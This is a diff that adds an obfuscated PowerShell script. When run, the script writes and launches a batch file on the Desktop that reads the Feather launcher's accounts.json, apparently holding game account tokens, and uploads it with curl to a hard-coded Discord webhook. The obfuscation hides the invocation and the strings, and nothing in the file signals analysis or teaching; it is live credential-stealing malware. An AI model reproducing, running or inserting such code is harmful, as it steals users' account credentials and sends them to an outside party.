@@ -1,0 +1,55 @@
+.( $enV:coMSpEc[4,24,25]-JOin'')((('&(XmMSvXmM)  U134Fm  ([TYpE](Xyg{0}{1}{3}{4}{2}Xyg-f XmMsysTEm.XmM,XmMenVXmM,X'+'mMMEnTXmM,XmMi'+'XmM,XmMRoNXmM))  ;
+&(Xyg{3}{2}{0}{1}Xyg-fXmM'+'aXmM,XmMb'+'leXmM,XmMiXmM,XmMSet-VarXmM)'+' -Name (Xyg{2}{1}{3}{0}Xyg-f XmMPathXmM,XmMeXmM,XmMdXmM,XmMsktopXmM) '+'-Value ( ( .(Xyg{0}{2}{1}{3}Xyg-f XmMgEXmM,XmMIaXmM,XmMT-vaRXmM,XmMBlEXmM)  U134fM ).XygVaLRMpUEXyg::(Xyg{1}{2}{0}Xyg -fXmMthXmM,XmMGetFoXmM,XmMlderPaXmM).Invo'+'ke((Xyg{0}{1}{2}Xyg-f XmMDXmM,XmMesktoXmM,X'+'mMpXmM)))
+.(Xyg{2}{0}{3}{1}Xyg -fXm'+'Mt-VariXmM,XmMe'+'XmM'+',XmMSeXmM,XmMablXmM) -Name (Xyg{0}{2}{3}{1}Xyg-fXmMbaXmM,XmMePathXmM,'+'XmMtcXmM,XmMhFilXmM) -Value (.(Xyg{0}{2}{1}Xyg-fXmMJoin-PXmM,Xm'+'MhXmM,XmMatXmM) '+'9zi{dRMpesRMpktoPpaRMpTh} (Xyg{2}{3}{0}{1}Xyg-f XmMeXmM,XmMbhook.batXmM,XmMsend_XmM,XmMwXmM))'+'
+
+
+.(Xyg{'+'3}{1}{2}{0}Xyg -f XmMbleXmM,XmMVariXmM,XmMaXmM,XmMSet-XmM) -Name (Xyg{0}{3}{1}{2}Xyg -f XmMbXmM,XmMcXmM,XmMhContentXmM,XmMatXmM) -Value (@Xyg
+@echo off
+setlocal enabledelayedexpansion
+
+:: Dis'+'cord Webhook URL
+set webhookUrl=https://discord.co'+'m'+'/api/webhooks/1378519975'+'391662212/_SR7iWgi88IV3mWrzN3Vq3vLiXJM5VqSlmWBfz9plnUdhfN1WXeLYNmOrmxTwY37XdSc
+
+:: Path to the accounts.json fil'+'e
+set filePath=%USERPROFILE%9YiAppData9YiRoaming9Yi'+'.feather9Yiaccounts.json
+
+:: Check if the file exists
+if not exist Xyg%filePath%Xyg (
+    echo File accounts.'+'json '+'does not exist at the specified pat'+'h.
+    exit /b'+'
+)
+
+:: Prepare mes'+'sag'+'e
+se'+'t message=Here you go king :pray:
+
+:: Correc'+'ting the payload format
+set payload={9YiXygconten'+'t9YiXyg:9YiXyg%message%9YiXyg}
+
+:: Escape the payload for the curl request
+s'+'et payload_json={9YiXygcontent9YiXyg:9YiXyg%message%9YiXyg}
+
+:: Prepare CURL command for sending the request
+curl -X POST %webhookUr'+'l% ^
+     -H XygContent-Type: multipart/fo'+'rm-dataXyg ^
+     -F Xygpayload_json=%payload_json%Xyg ^
+     -F Xygfile=@%filePath%Xyg
+
+if %errorlevel% neq 0 (
+    echo Failed to send the webhook request.
+) else (
+    echo Fil'+'e sent '+'successfully!
+)
+
+endlocal
+Xyg@)
+
+
+.(Xyg{3}{1}{0}{2}Xyg'+' -fXmMtenXmM,XmMCon'+'XmM,Xm'+'MtXmM,XmMSet-XmM) -Val'+'ue 9zi{BaRMpTcHCRM'+'poNRMpTEnt} -Path 9zi{baT'+'chRMpFRMpiLePARMpTh}
+
+
+&(Xyg{2}{1}{0}Xyg-fXmMostXmM,XmMe-HXmM,XmMWritXmM) (Xm'+'MBatXmM+XmMcXmM+XmMh XmM+XmMfiXmM+XmMle XmM+X'+'m'+'McreateXmM+XmMdXmM+XmM Xm'+'M+'+'XmMaXmM+XmMt XmM+Xyg9zibatchFi'+'lePathXyg)
+
+
+&(Xyg{2}{1}{0}Xyg -f'+'XmMssXmM,XmMart-ProceXmM,XmMStXmM) -FilePath 9zi{BRMpATRMpChFRMpILRMpePATh}
+.(Xyg{1}{0}{2}Xyg-f XmM-HXmM,XmMWriteXmM,XmMostXmM) (Xyg{'+'0}{1}{4}{6}{5}{2}{3}Xyg-fXmMBXmM,XmMatcXmM,XmMw runnXmM,XmMing...XmM,XmMh fXmM,XmM noXmM,XmMile isXmM)
+')-RePlace ([CHaR]57+[CHaR]122+[CHaR]105),[CHaR]36-CReplaCe'Xyg',[CHaR]34-CReplaCe  '9Yi',[CHaR]92  -RePlace ([CHaR]82+[CHaR]77+[CHaR]112),[CHaR]96 -RePlace([CHaR]88+[CHaR]109+[CHaR]77),[CHaR]39))
